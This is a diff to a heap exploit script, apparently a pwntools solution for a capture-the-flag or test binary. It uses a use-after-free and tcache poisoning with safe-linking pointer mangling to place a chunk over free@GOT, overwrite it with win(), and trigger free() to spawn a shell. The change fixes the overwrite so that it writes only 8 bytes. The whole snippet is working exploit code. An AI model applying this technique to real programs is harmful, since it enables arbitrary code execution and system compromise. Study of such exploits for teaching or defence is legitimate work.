@@ -85,7 +85,10 @@ try:
     choose(io, 3, 0, p64(key ^ free_got).ljust(0x20, b"\x00"))   # UAF edit: fd(0) = mangle(free_got)
     choose(io, 1, 2)                        # malloc -> chunk 0
     choose(io, 1, 3)                        # malloc -> free@GOT  (chunks[3] = &free@GOT)
-    choose(io, 3, 3, p64(win).ljust(0x20, b"\x00"))              # *free@GOT = win
+    # write ONLY 8 bytes: free@GOT = win. Do NOT pad to 0x20 -- the adjacent GOT slots
+    # (puts/write/system/printf) sit right after free@GOT, and win() itself calls printf and
+    # system, so zero-padding over them would crash win() before it spawns the shell.
+    choose(io, 3, 3, p64(win))                                   # *free@GOT = win (8 bytes only)
     choose(io, 2, 2)                        # free(valid chunk) -> calls free@GOT -> win() -> /bin/sh
     io.sendline(b"echo BINORACLE_PWNED; id")
     out = io.recvrepeat(2.0)
